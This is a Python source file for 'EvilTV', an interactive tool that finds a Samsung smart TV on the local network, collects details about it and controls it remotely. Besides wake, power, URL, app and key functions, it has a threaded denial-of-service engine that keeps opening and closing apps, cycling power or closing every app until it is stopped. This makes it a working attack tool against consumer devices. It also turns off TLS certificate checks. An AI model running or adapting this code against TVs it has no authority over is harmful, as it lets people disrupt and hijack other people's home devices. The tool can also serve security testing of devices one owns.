import os
import re
import sys
import json
import time
import socket
import base64
import urllib3
import requests
import threading
import wakeonlan
from prettytable import PrettyTable
from scapy.all import ARP, Ether, srp
from samsungtvws import SamsungTVWS
from samsungtvws.remote import SendRemoteKey
from samsungtvws.exceptions import ConnectionFailure, UnauthorizedError, HttpApiError

# Import app store utilities
from getSamsungTVStoreAppList import get_tv_apps, print_apps, interactive_store_browser, search_tv_apps

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

banner = """
░▒▓████████▓▒░              ░▒▓▓▒░   ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░               ░▒▓█▓▒░▒▓▓▒░      ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░    ░▒▓█▓▒▒▓█▓▒░▒▓█▓▒░▒▓▓▒░      ░▒▓█▓▒░    ░▒▓█▓▒▒▓█▓▒░  
░▒▓██████▓▒░▒▓█▓▒▒▓█▓▒░     ░▒▓▓▒░      ░▒▓█▓▒░    ░▒▓█▓▒▒▓█▓▒░  
░▒▓█▓▒░      ▒▓█▓▓█▓▒░░▒▓█▓▒░▒▓▓▒░      ░▒▓█▓▒░     ░▒▓█▓▓█▓▒░   
░▒▓█▓▒░      ▒▓█▓▓█▓▒░░▒▓█▓▒░▒▓▓▒░      ░▒▓█▓▒░     ░▒▓█▓▓█▓▒░   
░▒▓████████▓▒░▒▓██▓▒░ ░▒▓█▓▒░▒▓████▓▒░  ░▒▓█▓▒░      ░▒▓██▓▒░    
 
                By: Jordi Serrano @j0rd1s3rr4n0                  
"""


class SamsungTVController:
    RESET_COLOR = "\033[0m"
    GREEN = "\033[38;2;140;172;0m"
    RED = "\033[38;2;220;50;50m"
    YELLOW = "\033[38;2;230;180;0m"
    CYAN = "\033[38;2;0;200;220m"

    def __init__(self, config_file="config.cfg", token_file=None):
        self.base_dir = os.path.dirname(os.path.realpath(__file__))
        self.config_file = os.path.join(self.base_dir, config_file)
        self.token_file = token_file or os.path.join(self.base_dir, "tv-token.txt")

        # Connection attributes
        self.ip = None
        self.port = 8002
        self.wifi_mac = None
        self.tv = None
        self.device_info = {}

        # Parsed device attributes
        self.frame_tv_support = "Desconocido"
        self.gamepad_support = "Desconocido"
        self.ime_synced_support = "Desconocido"
        self.os = "Desconocido"
        self.token_auth_support = "Desconocido"
        self.voice_support = "Desconocido"
        self.country_code = "Desconocido"
        self.description = "Desconocido"
        self.developer_ip = "Desconocido"
        self.developer_mode = "Desconocido"
        self.duid = "Desconocido"
        self.firmware_version = "Desconocido"
        self.id = "Desconocido"
        self.model = "Desconocido"
        self.model_name = "Desconocido"
        self.name = "Desconocido"
        self.network_type = "Desconocido"
        self.resolution = "Desconocido"
        self.smart_hub_agreement = "Desconocido"
        self.ssid = "Desconocido"
        self.type = "Desconocido"
        self.udn = "Desconocido"
        self.is_support = "Desconocido"
        self.version = "Desconocido"
        self.uri = "Desconocido"
        self.remote = "Desconocido"

        # DoS simulation state
        self.dos_thread = None
        self.dos_stop_event = threading.Event()
        self.dos_running = False
        self.dos_mode = None

        # App store cache
        self.apps_data = []

    def print_banner(self):
        """Displays stylized gradient banner."""
        banner_lines = banner.strip('\n').split('\n')
        total = len(banner_lines)
        for i, line in enumerate(banner_lines):
            rpl = int(240 / max(1, total))
            lvalue = i * rpl
            red, green, blue = max(0, 255 - lvalue), 0, 0
            if i == total - 1:
                # Highlight author handle in orange
                line = line.replace("@j0rd1s3rr4n0", f"\033[38;2;227;117;0m@j0rd1s3rr4n0{self.RESET_COLOR}")
                print(f"\033[38;2;180;70;10m{line}{self.RESET_COLOR}")
            else:
                print(f"\033[38;2;{red};{green};{blue}m{line}{self.RESET_COLOR}")
        print()

    # -------------------------------------------------------------
    # Configuration Management
    # -------------------------------------------------------------
    def save_config(self):
        """Saves current TV connection and device information to config.cfg."""
        config_data = {
            "ip": self.ip,
            "port": self.port,
            "wifi_mac": self.wifi_mac,
            "name": self.name,
            "model": self.model,
            "model_name": self.model_name,
            "os": self.os,
            "resolution": self.resolution,
            "network_type": self.network_type,
            "firmware_version": self.firmware_version,
            "id": self.id,
            "duid": self.duid,
            "ssid": self.ssid,
            "country_code": self.country_code,
            "description": self.description,
            "developer_ip": self.developer_ip,
            "developer_mode": self.developer_mode,
            "frame_tv_support": self.frame_tv_support,
            "gamepad_support": self.gamepad_support,
            "ime_synced_support": self.ime_synced_support,
            "token_auth_support": self.token_auth_support,
            "voice_support": self.voice_support,
            "smart_hub_agreement": self.smart_hub_agreement,
            "type": self.type,
            "udn": self.udn,
            "is_support": self.is_support,
            "version": self.version,
            "uri": self.uri,
            "remote": self.remote
        }
        try:
            with open(self.config_file, "w") as f:
                json.dump(config_data, f, indent=4)
            print(f"{self.GREEN}[+] Configuration saved to {self.config_file}{self.RESET_COLOR}")
            return True
        except Exception as e:
            print(f"{self.RED}[-] Error saving configuration: {e}{self.RESET_COLOR}")
            return False

    def load_config(self):
        """Loads configuration from config.cfg if present."""
        if not os.path.exists(self.config_file):
            return False

        try:
            with open(self.config_file, "r") as f:
                data = json.load(f)

            self.ip = data.get("ip")
            self.port = data.get("port", 8002)
            self.wifi_mac = data.get("wifi_mac")
            self.name = data.get("name", "Desconocido")
            self.model = data.get("model", "Desconocido")
            self.model_name = data.get("model_name", "Desconocido")
            self.os = data.get("os", "Desconocido")
            self.resolution = data.get("resolution", "Desconocido")
            self.network_type = data.get("network_type", "Desconocido")
            self.firmware_version = data.get("firmware_version", "Desconocido")
            self.id = data.get("id", "Desconocido")
            self.duid = data.get("duid", "Desconocido")
            self.ssid = data.get("ssid", "Desconocido")
            self.country_code = data.get("country_code", "Desconocido")
            self.description = data.get("description", "Desconocido")
            self.developer_ip = data.get("developer_ip", "Desconocido")
            self.developer_mode = data.get("developer_mode", "Desconocido")
            self.frame_tv_support = data.get("frame_tv_support", "Desconocido")
            self.gamepad_support = data.get("gamepad_support", "Desconocido")
            self.ime_synced_support = data.get("ime_synced_support", "Desconocido")
            self.token_auth_support = data.get("token_auth_support", "Desconocido")
            self.voice_support = data.get("voice_support", "Desconocido")
            self.smart_hub_agreement = data.get("smart_hub_agreement", "Desconocido")
            self.type = data.get("type", "Desconocido")
            self.udn = data.get("udn", "Desconocido")
            self.is_support = data.get("is_support", "Desconocido")
            self.version = data.get("version", "Desconocido")
            self.uri = data.get("uri", "Desconocido")
            self.remote = data.get("remote", "Desconocido")

            if self.ip:
                self.init_tv()
                return True
        except Exception as e:
            print(f"{self.RED}[-] Error reading {self.config_file}: {e}{self.RESET_COLOR}")

        return False

    def reset_connection(self):
        """Clears configuration and token files to allow re-pairing."""
        self.stop_dos()
        for filename in [self.config_file, self.token_file]:
            if os.path.exists(filename):
                try:
                    os.remove(filename)
                    print(f"{self.YELLOW}[!] Removed {filename}{self.RESET_COLOR}")
                except Exception as e:
                    print(f"{self.RED}[-] Failed removing {filename}: {e}{self.RESET_COLOR}")

        self.ip = None
        self.wifi_mac = None
        self.tv = None
        self.device_info = {}
        print(f"{self.GREEN}[+] Connection reset complete.{self.RESET_COLOR}")

    # -------------------------------------------------------------
    # Discovery & Network Helpers
    # -------------------------------------------------------------
    def test_connection(self, ip, port, timeout=2):
        """Tests whether a TCP port is open on the target IP."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((ip, port))
            sock.close()
            return result == 0
        except socket.error:
            return False

    def ip_to_mac(self, ip):
        """Resolves MAC address for a given IP using ARP or system tables."""
        # 1. Try Scapy ARP request
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            answered_list = srp(broadcast / arp_request, timeout=1.5, verbose=False)[0]
            if answered_list:
                return answered_list[0][1].hwsrc
        except Exception:
            pass

        # 2. Try reading /proc/net/arp on Linux
        try:
            if os.path.exists('/proc/net/arp'):
                with open('/proc/net/arp', 'r') as f:
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 4 and parts[0] == ip and parts[3] != '00:00:00:00:00:00':
                            return parts[3]
        except Exception:
            pass

        return None

    def get_device_info(self, ip):
        """Fetches technical information from the TV REST endpoint."""
        # Try port 8001 (unencrypted REST) first, then 8002 (SSL)
        endpoints = [f"http://{ip}:8001/api/v2/", f"https://{ip}:8002/api/v2/"]
        for endpoint in endpoints:
            try:
                response = requests.get(endpoint, timeout=3, verify=False)
                if response.status_code == 200:
                    self.device_info = response.json()
                    return self.device_info
            except Exception:
                continue
        return {}

    def parse_device_info(self):
        """Extracts known attributes from device_info dict."""
        if not self.device_info:
            return

        device = self.device_info.get("device", {})
        self.frame_tv_support = device.get("FrameTVSupport", "Desconocido")
        self.gamepad_support = device.get("GamePadSupport", "Desconocido")
        self.ime_synced_support = device.get("ImeSyncedSupport", "Desconocido")
        self.os = device.get("OS", "Desconocido")
        self.token_auth_support = device.get("TokenAuthSupport", "Desconocido")
        self.voice_support = device.get("VoiceSupport", "Desconocido")
        self.country_code = device.get("countryCode", "Desconocido")
        self.description = device.get("description", "Desconocido")
        self.developer_ip = device.get("developerIP", "Desconocido")
        self.developer_mode = device.get("developerMode", "Desconocido")
        self.duid = device.get("duid", "Desconocido")
        self.firmware_version = device.get("firmwareVersion", "Desconocido")
        self.id = device.get("id", "Desconocido")
        self.model = device.get("model", "Desconocido")
        self.model_name = device.get("modelName", "Desconocido")
        self.name = device.get("name", "Desconocido")
        self.network_type = device.get("networkType", "Desconocido")
        self.resolution = device.get("resolution", "Desconocido")
        self.smart_hub_agreement = device.get("smartHubAgreement", "Desconocido")
        self.ssid = device.get("ssid", "Desconocido")
        self.type = device.get("type", "Desconocido")
        self.udn = device.get("udn", "Desconocido")
        
        # Use WiFi MAC from device REST if available
        rest_mac = device.get("wifiMac")
        if rest_mac and rest_mac != "Desconocido":
            self.wifi_mac = rest_mac

        self.is_support = self.device_info.get("isSupport", "Desconocido")
        self.version = self.device_info.get("version", "Desconocido")
        self.uri = self.device_info.get("uri", "Desconocido")
        self.remote = self.device_info.get("remote", "Desconocido")

    def init_tv(self):
        """Instantiates SamsungTVWS client with loaded IP, port, and token."""
        if not self.ip:
            return False
        try:
            self.tv = SamsungTVWS(host=self.ip, port=self.port, token_file=self.token_file, timeout=5)
            return True
        except Exception as e:
            print(f"{self.RED}[-] Error initializing SamsungTVWS: {e}{self.RESET_COLOR}")
            return False

    def setup_connection(self):
        """Guides user through initial TV discovery and connection setup."""
        print(f"\n{self.CYAN}--- Initial Samsung TV Setup ---{self.RESET_COLOR}")
        print("Enter TV IP address or press Enter to scan local network (if supported):")
        target_ip = input("TV IP: ").strip()

        if not target_ip:
            print(f"{self.YELLOW}[*] IP cannot be empty. Please specify target IP.{self.RESET_COLOR}")
            return False

        self.ip = target_ip

        # Check ports 8002 (WSS) and 8001 (WS)
        if self.test_connection(self.ip, 8002):
            self.port = 8002
            print(f"{self.GREEN}[+] Detected secure WebSocket on port 8002.{self.RESET_COLOR}")
        elif self.test_connection(self.ip, 8001):
            self.port = 8001
            print(f"{self.GREEN}[+] Detected standard WebSocket on port 8001.{self.RESET_COLOR}")
        else:
            print(f"{self.YELLOW}[!] Neither port 8002 nor 8001 responded. TV might be off or on another subnet.{self.RESET_COLOR}")
            self.port = 8002

        # Obtain MAC address
        resolved_mac = self.ip_to_mac(self.ip)
        if resolved_mac:
            self.wifi_mac = resolved_mac
            print(f"{self.GREEN}[+] Resolved MAC address via ARP: {self.wifi_mac}{self.RESET_COLOR}")
        else:
            mac_input = input("Enter TV MAC address for Wake-on-LAN (optional, or press Enter): ").strip()
            if mac_input:
                self.wifi_mac = mac_input

        # Try querying REST info
        print(f"{self.CYAN}[*] Fetching device information...{self.RESET_COLOR}")
        self.get_device_info(self.ip)
        self.parse_device_info()

        # Save config
        self.save_config()
        self.init_tv()
        return True

    # -------------------------------------------------------------
    # Menu Option Implementations
    # -------------------------------------------------------------
    def display_device_info(self):
        """Option 1: Displays structured technical device info in a PrettyTable."""
        print(f"\n{self.GREEN}========== Samsung TV Device Info =========={self.RESET_COLOR}")
        table = PrettyTable()
        table.field_names = ["Property", "Value"]
        table.align["Property"] = "l"
        table.align["Value"] = "l"

        table.add_row(["TV Name", self.name])
        table.add_row(["Model Name", self.model_name])
        table.add_row(["Model", self.model])
        table.add_row(["Operating System", self.os])
        table.add_row(["IP Address", self.ip])
        table.add_row(["WebSocket Port", self.port])
        table.add_row(["WiFi MAC", self.wifi_mac or "Desconocido"])
        table.add_row(["Resolution", self.resolution])
        table.add_row(["Network Type", self.network_type])
        table.add_row(["Firmware Version", self.firmware_version])
        table.add_row(["DUID", self.duid])
        table.add_row(["SSID", self.ssid])
        table.add_row(["FrameTV Support", self.frame_tv_support])
        table.add_row(["GamePad Support", self.gamepad_support])
        table.add_row(["Voice Support", self.voice_support])
        table.add_row(["Token Auth Support", self.token_auth_support])

        print(table)

    def send_wol(self):
        """Option 2: Sends Wake On LAN magic packet to the TV's MAC address."""
        if not self.wifi_mac or self.wifi_mac == "Desconocido":
            print(f"{self.YELLOW}[!] No MAC address configured.{self.RESET_COLOR}")
            mac = input("Enter MAC address: ").strip()
            if mac:
                self.wifi_mac = mac
                self.save_config()
            else:
                return

        print(f"{self.CYAN}[*] Sending WakeOnLAN magic packet to {self.wifi_mac}...{self.RESET_COLOR}")
        try:
            wakeonlan.send_magic_packet(self.wifi_mac)
            print(f"{self.GREEN}[+] WakeOnLAN packet sent successfully.{self.RESET_COLOR}")
        except Exception as e:
            print(f"{self.RED}[-] Failed to send WakeOnLAN: {e}{self.RESET_COLOR}")

    def power_toggle(self):
        """Option 3: Wakes up TV and toggles power state."""
        if self.wifi_mac and self.wifi_mac != "Desconocido":
            print(f"{self.CYAN}[*] Sending WOL packet to ensure network wake...{self.RESET_COLOR}")
            try:
                wakeonlan.send_magic_packet(self.wifi_mac)
            except Exception:
                pass

        print(f"{self.CYAN}[*] Sending Power Toggle command...{self.RESET_COLOR}")
        try:
            if not self.tv:
                self.init_tv()
            self.tv.shortcuts().power()
            print(f"{self.GREEN}[+] Power command sent.{self.RESET_COLOR}")
        except Exception as e:
            print(f"{self.RED}[-] Power command error: {e}{self.RESET_COLOR}")
            print(f"{self.YELLOW}[i] If the TV is in deep standby, it may require a few seconds to wake via WOL.{self.RESET_COLOR}")

    def open_url(self):
        """Option 4: Opens a target URL in the TV's web browser."""
        url = input("Enter the URL to open (e.g., https://google.com): ").strip()
        if not url:
            return

        if not url.startswith("http://") and not url.startswith("https://"):
            url = f"https://{url}"

        print(f"{self.CYAN}[*] Opening URL '{url}' on Samsung TV browser...{self.RESET_COLOR}")
        try:
            if not self.tv:
                self.init_tv()
            self.tv.open_browser(url)
            print(f"{self.GREEN}[+] Browser open command sent successfully.{self.RESET_COLOR}")
        except Exception as e:
            print(f"{self.RED}[-] Error opening URL on TV: {e}{self.RESET_COLOR}")

    def display_apps_in_table(self, apps):
        """Displays installed TV apps in a PrettyTable."""
        if not apps:
            print(f"{self.YELLOW}[!] No apps found or unable to fetch app list.{self.RESET_COLOR}")
            return

        table = PrettyTable()
        table.field_names = ["#", "App ID", "Name", "Locked"]
        table.align["Name"] = "l"

        for idx, app in enumerate(apps, 1):
            app_id = app.get('appId', 'N/A')
            name = app.get('name', 'N/A')
            is_locked = "Yes" if app.get('is_lock') else "No"
            table.add_row([idx, app_id, name, is_locked])

        print(f"\n{self.GREEN}Installed Applications ({len(apps)}):{self.RESET_COLOR}")
        print(table)

    def manage_applications(self):
        """Option 5: Interactive submenu for managing installed applications."""
        if not self.tv:
            self.init_tv()

        try:
            apps = self.tv.app_list()
        except Exception as e:
            print(f"{self.RED}[-] Error fetching installed apps: {e}{self.RESET_COLOR}")
            apps = []

        self.display_apps_in_table(apps)
        installed_ids = [str(a.get('appId')) for a in apps if a.get('appId')]

        while True:
            print(f"""
{self.CYAN}--- Application Management ---{self.RESET_COLOR}
01) Run App (Launch by ID)
02) Get App Status
03) Open App (REST)
04) Close App (REST)
05) Open All Installed Apps
06) Close All Installed Apps
07) Install App by ID
08) Refresh App List
99) Back to Main Menu
""")
            choice = input("Apps > ").strip()

            if choice in ("1", "01"):
                app_id = input("Enter App ID to run: ").strip()
                if app_id:
                    try:
                        self.tv.run_app(app_id)
                        print(f"{self.GREEN}[+] Launched app {app_id}{self.RESET_COLOR}")
                    except Exception as e:
                        print(f"{self.RED}[-] Failed to launch app: {e}{self.RESET_COLOR}")

            elif choice in ("2", "02"):
                app_id = input("Enter App ID for status: ").strip()
                if app_id:
                    try:
                        status = self.tv.rest_app_status(app_id)
                        print(f"{self.GREEN}[+] App Status: {json.dumps(status, indent=2)}{self.RESET_COLOR}")
                    except Exception as e:
                        print(f"{self.RED}[-] Failed to get status: {e}{self.RESET_COLOR}")

            elif choice in ("3", "03"):
                app_id = input("Enter App ID to open (REST): ").strip()
                if app_id:
                    try:
                        res = self.tv.rest_app_run(app_id)
                        print(f"{self.GREEN}[+] Opened app: {res}{self.RESET_COLOR}")
                    except Exception as e:
                        print(f"{self.RED}[-] Failed: {e}{self.RESET_COLOR}")

            elif choice in ("4", "04"):
                app_id = input("Enter App ID to close: ").strip()
                if app_id:
                    try:
                        res = self.tv.rest_app_stop(app_id)
                        print(f"{self.GREEN}[+] Closed app: {res}{self.RESET_COLOR}")
                    except Exception as e:
                        print(f"{self.RED}[-] Failed: {e}{self.RESET_COLOR}")

            elif choice in ("5", "05"):
                print(f"{self.CYAN}[*] Opening all installed applications...{self.RESET_COLOR}")
                for aid in installed_ids:
                    try:
                        self.tv.rest_app_run(aid)
                        time.sleep(0.5)
                    except Exception:
                        pass
                print(f"{self.GREEN}[+] Finished opening cycle.{self.RESET_COLOR}")

            elif choice in ("6", "06"):
                print(f"{self.CYAN}[*] Closing all installed applications...{self.RESET_COLOR}")
                for aid in installed_ids:
                    try:
                        self.tv.rest_app_stop(aid)
                        time.sleep(0.3)
                    except Exception:
                        pass
                print(f"{self.GREEN}[+] Finished closing cycle.{self.RESET_COLOR}")

            elif choice in ("7", "07"):
                app_id = input("Enter App ID to install from Samsung Store: ").strip()
                if app_id:
                    try:
                        res = self.tv.rest_app_install(app_id)
                        print(f"{self.GREEN}[+] Install command sent: {res}{self.RESET_COLOR}")
                    except Exception as e:
                        print(f"{self.RED}[-] Install error: {e}{self.RESET_COLOR}")

            elif choice in ("8", "08"):
                try:
                    apps = self.tv.app_list()
                    installed_ids = [str(a.get('appId')) for a in apps if a.get('appId')]
                    self.display_apps_in_table(apps)
                except Exception as e:
                    print(f"{self.RED}[-] Error: {e}{self.RESET_COLOR}")

            elif choice in ("99", "back", "exit", "q"):
                break
            else:
                print(f"{self.YELLOW}[!] Invalid option.{self.RESET_COLOR}")

    def interactive_remote_control(self):
        """Option 6: Interactive remote control keypad allowing continuous keypresses."""
        if not self.tv:
            self.init_tv()

        key_map = {
            "1": ("KEY_POWER", "Power"),
            "2": ("KEY_VOLUP", "Volume Up"),
            "3": ("KEY_VOLDOWN", "Volume Down"),
            "4": ("KEY_MUTE", "Mute"),
            "5": ("KEY_CHUP", "Channel Up"),
            "6": ("KEY_CHDOWN", "Channel Down"),
            "7": ("KEY_UP", "Up"),
            "8": ("KEY_DOWN", "Down"),
            "9": ("KEY_LEFT", "Left"),
            "10": ("KEY_RIGHT", "Right"),
            "11": ("KEY_ENTER", "Enter / Select"),
            "12": ("KEY_RETURN", "Back / Return"),
            "13": ("KEY_HOME", "Home / SmartHub"),
            "14": ("KEY_MENU", "Menu"),
            "15": ("KEY_PLAY", "Play"),
            "16": ("KEY_PAUSE", "Pause"),
            "17": ("KEY_STOP", "Stop"),
        }

        while True:
            print(f"""
{self.GREEN}================================================================{self.RESET_COLOR}
                  {self.CYAN}📺 EVILTV - INTERACTIVE REMOTE CONTROL 📺{self.RESET_COLOR}
{self.GREEN}================================================================{self.RESET_COLOR}
  [1] Power           [2] Vol +           [3] Vol -           [4] Mute
  [5] Channel +       [6] Channel -       [7] Up              [8] Down
  [9] Left            [10] Right          [11] Enter          [12] Return
  [13] Home           [14] Menu           [15] Play           [16] Pause
  [17] Stop           [N] Number (0-9)    [C] Custom Raw Key  [Q] Back to Menu
{self.GREEN}================================================================{self.RESET_COLOR}
""")
            cmd = input("Remote > ").strip().lower()

            if cmd in ('q', 'exit', 'back', '99'):
                break

            target_key = None
            if cmd in key_map:
                target_key, label = key_map[cmd]
                print(f"{self.CYAN}[*] Sending {label} ({target_key})...{self.RESET_COLOR}")
            elif cmd == 'n':
                num = input("Enter number digit (0-9): ").strip()
                if num in [str(i) for i in range(10)]:
                    target_key = f"KEY_{num}"
                else:
                    print(f"{self.YELLOW}[!] Invalid digit.{self.RESET_COLOR}")
                    continue
            elif cmd == 'c':
                raw_key = input("Enter exact Samsung key (e.g. KEY_SOURCE, KEY_INFO): ").strip().upper()
                if raw_key:
                    target_key = raw_key
            else:
                print(f"{self.YELLOW}[!] Unknown command key.{self.RESET_COLOR}")
                continue

            if target_key:
                try:
                    self.tv.send_key(target_key)
                    print(f"{self.GREEN}[+] Key '{target_key}' delivered.{self.RESET_COLOR}")
                except Exception as e:
                    print(f"{self.RED}[-] Send error: {e}{self.RESET_COLOR}")

    def view_available_apps(self):
        """Option 7: Interactive pagination and search of Samsung TV Store apps."""
        country = input("Enter country code (default US): ").strip().upper() or 'US'
        language = input("Enter language code (default en): ").strip().lower() or 'en'
        self.apps_data = get_tv_apps(country_code=country, language_code=language, size=25, offset=0)
        interactive_store_browser(country_code=country, language_code=language, page_size=25)

    def select_app_by_id(self):
        """Option 8: Interacts with an app by App ID (Install / Run / Status)."""
        app_id = input("Enter App ID: ").strip()
        if not app_id:
            return

        print(f"""
Select action for App ID '{app_id}':
1) Install from Samsung Store
2) Run / Launch App
3) Check App Status
9) Cancel
""")
        action = input("> ").strip()
        if action == "1":
            try:
                res = self.tv.rest_app_install(app_id)
                print(f"{self.GREEN}[+] Install command sent: {res}{self.RESET_COLOR}")
            except Exception as e:
                print(f"{self.RED}[-] Install error: {e}{self.RESET_COLOR}")
        elif action == "2":
            try:
                self.tv.run_app(app_id)
                print(f"{self.GREEN}[+] Run app command sent.{self.RESET_COLOR}")
            except Exception as e:
                print(f"{self.RED}[-] Run error: {e}{self.RESET_COLOR}")
        elif action == "3":
            try:
                status = self.tv.rest_app_status(app_id)
                print(f"{self.GREEN}[+] Status: {json.dumps(status, indent=2)}{self.RESET_COLOR}")
            except Exception as e:
                print(f"{self.RED}[-] Status error: {e}{self.RESET_COLOR}")

    # -------------------------------------------------------------
    # DoS Simulation Engine (Threading Background Worker)
    # -------------------------------------------------------------
    def _dos_worker(self, mode):
        """
        Background worker thread executing simulated DoS attacks:
        - Mode 1: Open and close apps repeatedly
        - Mode 2: Send Wake On LAN and power off repeatedly
        - Mode 3: Close all apps repeatedly
        """
        print(f"\n{self.RED}[!] Background DoS attack started (Mode {mode})!{self.RESET_COLOR}")
        installed_ids = []

        try:
            if self.tv:
                apps = self.tv.app_list()
                installed_ids = [str(a.get('appId')) for a in apps if a.get('appId')]
        except Exception:
            pass

        cycle = 0
        while not self.dos_stop_event.is_set():
            cycle += 1
            try:
                if mode == 1:
                    # Mode 1: Open and close apps indefinitely
                    if installed_ids:
                        target = installed_ids[cycle % len(installed_ids)]
                        self.tv.rest_app_run(target)
                        time.sleep(1.0)
                        self.tv.rest_app_stop(target)
                    else:
                        # Fallback to key flood if no apps list
                        self.tv.send_key("KEY_HOME")
                        time.sleep(1.0)
                        self.tv.send_key("KEY_RETURN")

                elif mode == 2:
                    # Mode 2: Send WOL and power off repeatedly
                    if self.wifi_mac and self.wifi_mac != "Desconocido":
                        wakeonlan.send_magic_packet(self.wifi_mac)
                    time.sleep(2.0)
                    if self.tv:
                        self.tv.shortcuts().power()
                    time.sleep(3.0)

                elif mode == 3:
                    # Mode 3: Close all apps indefinitely
                    if installed_ids:
                        for aid in installed_ids:
                            if self.dos_stop_event.is_set():
                                break
                            self.tv.rest_app_stop(aid)
                            time.sleep(0.3)
                    else:
                        time.sleep(1.0)

            except Exception:
                # DoS should keep running despite network jitter or drops
                time.sleep(1.0)

        print(f"\n{self.GREEN}[+] DoS Worker thread terminated cleanly.{self.RESET_COLOR}")

    def start_dos(self):
        """Option 9: Prompts for DoS mode and spawns background worker."""
        if self.dos_running and self.dos_thread and self.dos_thread.is_alive():
            print(f"{self.YELLOW}[!] DoS attack is already running (Mode {self.dos_mode}). Stop it first with Option 10.{self.RESET_COLOR}")
            return

        print(f"""
{self.RED}================================================================{self.RESET_COLOR}
                {self.RED}⚠️ SIMULATED DENIAL OF SERVICE (DoS) ⚠️{self.RESET_COLOR}
{self.RED}================================================================{self.RESET_COLOR}
  1) Open and close apps indefinitely
  2) Send Wake On LAN and power off indefinitely
  3) Close all apps indefinitely
  9) Cancel / Back
""")
        mode_choice = input("Select DoS mode [1-3]: ").strip()
        if mode_choice not in ("1", "2", "3"):
            print("Cancelled.")
            return

        mode = int(mode_choice)
        self.dos_stop_event.clear()
        self.dos_running = True
        self.dos_mode = mode

        self.dos_thread = threading.Thread(target=self._dos_worker, args=(mode,), daemon=True)
        self.dos_thread.start()
        print(f"{self.GREEN}[+] DoS Mode {mode} is now running in the background.{self.RESET_COLOR}")
        print(f"{self.YELLOW}[i] The main menu is still available. Use Option 10 to stop the attack.{self.RESET_COLOR}")

    def stop_dos(self):
        """Option 10: Stops any active background DoS attack."""
        if not self.dos_running or not self.dos_thread:
            print(f"{self.YELLOW}[i] No DoS attack is currently active.{self.RESET_COLOR}")
            return

        print(f"{self.CYAN}[*] Stopping DoS attack...{self.RESET_COLOR}")
        self.dos_stop_event.set()
        if self.dos_thread.is_alive():
            self.dos_thread.join(timeout=4.0)

        self.dos_running = False
        self.dos_mode = None
        self.dos_thread = None
        print(f"{self.GREEN}[+] DoS attack successfully stopped.{self.RESET_COLOR}")

    # -------------------------------------------------------------
    # Main Menu Loop
    # -------------------------------------------------------------
    def menu(self):
        """Main interactive loop for EvilTV."""
        self.print_banner()

        if not self.load_config():
            if not self.setup_connection():
                print(f"{self.RED}[-] Setup could not be completed. Exiting.{self.RESET_COLOR}")
                return

        while True:
            dos_status = f"{self.RED}[DoS Mode {self.dos_mode} RUNNING]{self.RESET_COLOR}" if self.dos_running else f"{self.GREEN}[Idle]{self.RESET_COLOR}"
            print(f"""
{self.CYAN}--- EvilTV Main Menu --- {dos_status}{self.RESET_COLOR}
01) Display Device Info
02) WakeOnLAN
03) Power On/Off
04) Open URL
05) Applications Management
06) Send Command (Interactive Remote Control)
07) View Available Apps (Samsung Store)
08) Select App by APP ID
09) Start DoS
10) Stop DoS
98) Reset Connection
99) Exit
""")
            try:
                option = input("> ").strip()
            except (KeyboardInterrupt, EOFError):
                print("\nExiting...")
                self.stop_dos()
                break

            if option in ("1", "01"):
                self.display_device_info()
            elif option in ("2", "02"):
                self.send_wol()
            elif option in ("3", "03"):
                self.power_toggle()
            elif option in ("4", "04"):
                self.open_url()
            elif option in ("5", "05"):
                self.manage_applications()
            elif option in ("6", "06"):
                self.interactive_remote_control()
            elif option in ("7", "07"):
                self.view_available_apps()
            elif option in ("8", "08"):
                self.select_app_by_id()
            elif option in ("9", "09"):
                self.start_dos()
            elif option == "10":
                self.stop_dos()
            elif option == "98":
                confirm = input("Are you sure you want to reset connection and delete config? (y/N): ").strip().lower()
                if confirm == 'y':
                    self.reset_connection()
                    if not self.setup_connection():
                        break
            elif option in ("99", "exit", "quit"):
                print("Exiting EvilTV. Goodbye!")
                self.stop_dos()
                break
            else:
                print(f"{self.YELLOW}[!] Invalid option. Please choose from the menu.{self.RESET_COLOR}")


if __name__ == "__main__":
    controller = SamsungTVController()
    controller.menu()
